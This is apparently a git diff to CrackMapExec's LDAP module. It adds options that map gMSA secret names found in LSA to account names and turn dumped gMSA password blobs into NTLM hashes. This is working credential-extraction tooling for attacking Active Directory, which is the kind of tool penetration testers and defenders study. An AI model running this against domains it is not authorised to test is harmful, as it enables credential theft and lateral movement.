@@ -4,6 +4,7 @@
 # https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
 
 import logging
+import hmac
 from argparse import _StoreTrueAction
 from binascii import b2a_hex, unhexlify, hexlify
 from cme.connection import *
@@ -105,8 +106,12 @@ class ldap(connection):
         vgroup.add_argument("--admin-count", action="store_true", help="Get objets that had the value adminCount=1")
         vgroup.add_argument("--users", action="store_true", help="Enumerate enabled domain users")
         vgroup.add_argument("--groups", action="store_true", help="Enumerate domain groups")
-        vgroup.add_argument("--gmsa", action="store_true", help="Enumerate GMSA passwords")
         vgroup.add_argument("--get-sid", action="store_true", help="Get domain sid")
+
+        ggroup = ldap_parser.add_argument_group("Retrevie gmsa on the remote DC", "Options to play with gmsa")
+        ggroup.add_argument("--gmsa", action="store_true", help="Enumerate GMSA passwords")
+        ggroup.add_argument("--gmsa-convert-id", help="Get the secret name of specific gmsa or all gmsa if no gmsa provided")
+        ggroup.add_argument("--gmsa-decrypt-lsa", help="Decrypt the gmsa encrypted value from LSA")
 
         return parser
 
@@ -1079,7 +1084,7 @@ class ldap(connection):
                 if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                     continue
                 sAMAccountName =  ''
-                managedPassword = ''
+                passwd = ''
                 for attribute in item['attributes']:
                     if str(attribute['type']) == 'sAMAccountName':
                         sAMAccountName = str(attribute['vals'][0])
@@ -1091,5 +1096,85 @@ class ldap(connection):
                         ntlm_hash = MD4.new ()
                         ntlm_hash.update (currentPassword)
                         passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
-                        self.logger.highlight("Account: {:<20} NTLM: {}".format(sAMAccountName, passwd))
+                self.logger.highlight("Account: {:<20} NTLM: {}".format(sAMAccountName, passwd))
         return True
+
+    def decipher_gmsa_name(self, domain_name=None, account_name=None):
+        # https://aadinternals.com/post/gmsa/
+        gmsa_account_name = (domain_name + account_name).upper()
+        self.logger.debug(f"GMSA name for {gmsa_account_name}")
+        bin_account_name = gmsa_account_name.encode("utf-16le")
+        bin_hash = hmac.new(bytes('' , 'latin-1'), msg = bin_account_name, digestmod = hashlib.sha256).digest()
+        hex_letters = "0123456789abcdef"
+        str_hash = ""
+        for b in bin_hash:
+            str_hash += hex_letters[b & 0x0f]
+            str_hash += hex_letters[b >> 0x04]
+        self.logger.debug(f"Hash2: {str_hash}")
+        return str_hash
+
+    def gmsa_convert_id(self):
+        if self.args.gmsa_convert_id:
+            if len(self.args.gmsa_convert_id) != 64:
+                self.logger.error("Length of the gmsa id not correct :'(")
+            else:
+                # getting the gmsa account
+                search_filter = '(objectClass=msDS-GroupManagedServiceAccount)'
+                gmsa_accounts = self.ldapConnection.search(searchFilter=search_filter,
+                                            attributes=['sAMAccountName'],
+                                            sizeLimit=0,
+                                            searchBase=self.baseDN)
+                if gmsa_accounts:
+                    answers = []
+                    logging.debug('Total of records returned %d' % len(gmsa_accounts))
+
+                    for item in gmsa_accounts:
+                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                            continue
+                        sAMAccountName =  ''
+                        for attribute in item['attributes']:
+                            if str(attribute['type']) == 'sAMAccountName':
+                                sAMAccountName = str(attribute['vals'][0])
+                                if self.decipher_gmsa_name(self.domain.split('.')[0], sAMAccountName[:-1]) == self.args.gmsa_convert_id:
+                                    self.logger.highlight("Account: {:<20} ID: {}".format(sAMAccountName, self.args.gmsa_convert_id))
+                                    break
+        else:
+            self.logger.error("No string provided :'(")
+
+    def gmsa_decrypt_lsa(self):
+        if self.args.gmsa_decrypt_lsa:
+            if "_SC_GMSA_{84A78B8C" in self.args.gmsa_decrypt_lsa:
+                gmsa = self.args.gmsa_decrypt_lsa.split("_")[4].split(":")
+                gmsa_id = gmsa[0]
+                gmsa_pass = gmsa[1]
+                # getting the gmsa account
+                search_filter = '(objectClass=msDS-GroupManagedServiceAccount)'
+                gmsa_accounts = self.ldapConnection.search(searchFilter=search_filter,
+                                            attributes=['sAMAccountName'],
+                                            sizeLimit=0,
+                                            searchBase=self.baseDN)
+                if gmsa_accounts:
+                    answers = []
+                    logging.debug('Total of records returned %d' % len(gmsa_accounts))
+
+                    for item in gmsa_accounts:
+                        if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                            continue
+                        sAMAccountName =  ''
+                        for attribute in item['attributes']:
+                            if str(attribute['type']) == 'sAMAccountName':
+                                sAMAccountName = str(attribute['vals'][0])
+                                if self.decipher_gmsa_name(self.domain.split('.')[0], sAMAccountName[:-1]) == gmsa_id:
+                                    gmsa_id = sAMAccountName
+                                    break
+                # convert to ntlm
+                data = bytes.fromhex(gmsa_pass)
+                blob = MSDS_MANAGEDPASSWORD_BLOB()
+                blob.fromString(data)
+                currentPassword = blob['CurrentPassword'][:-2]
+                ntlm_hash = MD4.new ()
+                ntlm_hash.update (currentPassword)
+                passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
+                self.logger.highlight("Account: {:<20} NTLM: {}".format(gmsa_id, passwd))
+        else:
+            self.logger.error("No string provided :'(")
